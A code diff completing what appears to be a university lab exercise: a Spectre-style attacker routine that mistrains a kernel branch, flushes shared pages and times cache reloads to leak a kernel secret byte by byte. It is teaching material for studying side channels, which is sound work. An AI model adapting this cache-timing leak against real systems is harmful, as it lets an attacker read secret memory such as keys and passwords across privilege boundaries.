@@ -29,6 +29,11 @@ static inline void call_kernel_part3(int kernel_fd, char *shared_memory, size_t 
 
     write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
 }
+#define REPEAT(a) a; a; a; 
+
+#define NUM_SAMPLES 100
+#define DEBUG 0
+uint32_t warmup=0;
 
 /*
  * run_attacker
@@ -46,8 +51,47 @@ int run_attacker(int kernel_fd, char *shared_memory) {
     for (current_offset = 0; current_offset < LAB2_SECRET_MAX_LEN; current_offset++) {
         char leaked_byte;
 
-        // [Part 3]- Fill this in!
-        // leaked_byte = ??
+        do {
+            size_t times[LAB2_SHARED_MEMORY_NUM_PAGES] = {0};
+            size_t min = 1000000000;
+            //Flush all shared memory from cache
+            for (size_t Samples = 0; Samples < NUM_SAMPLES; Samples++)
+            {   
+                REPEAT(call_kernel_part3(kernel_fd, shared_memory, current_offset % 2))    
+                for (size_t i = 0; i < LAB2_SHARED_MEMORY_NUM_PAGES; i++)
+                {
+                    clflush(shared_memory+(i*LAB2_PAGE_SIZE));
+                }
+                call_kernel_part3(kernel_fd, shared_memory, current_offset);
+                for (size_t i = 0; i < LAB2_SHARED_MEMORY_NUM_PAGES; i++)
+                {
+                    times[i] += time_access(shared_memory+(i*LAB2_PAGE_SIZE));   
+                }
+            }
+
+            for (size_t i = 0; i < LAB2_SHARED_MEMORY_NUM_PAGES; i++)
+            {
+                times[i] = times[i]/NUM_SAMPLES;
+                #if DEBUG
+                printf("%c: %ld ",i ,times[i]/NUM_SAMPLES);
+                if (i % 20 ==0)
+                {
+                    printf("\n");
+                }
+                #endif
+                if (times[i] < min)
+                {
+                    min = times[i];
+                    leaked_byte = (char) i;
+                }
+                
+            }
+            #if DEBUG
+            printf("\n\n");
+            #endif
+            
+
+        }while(warmup++ < 15);
 
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
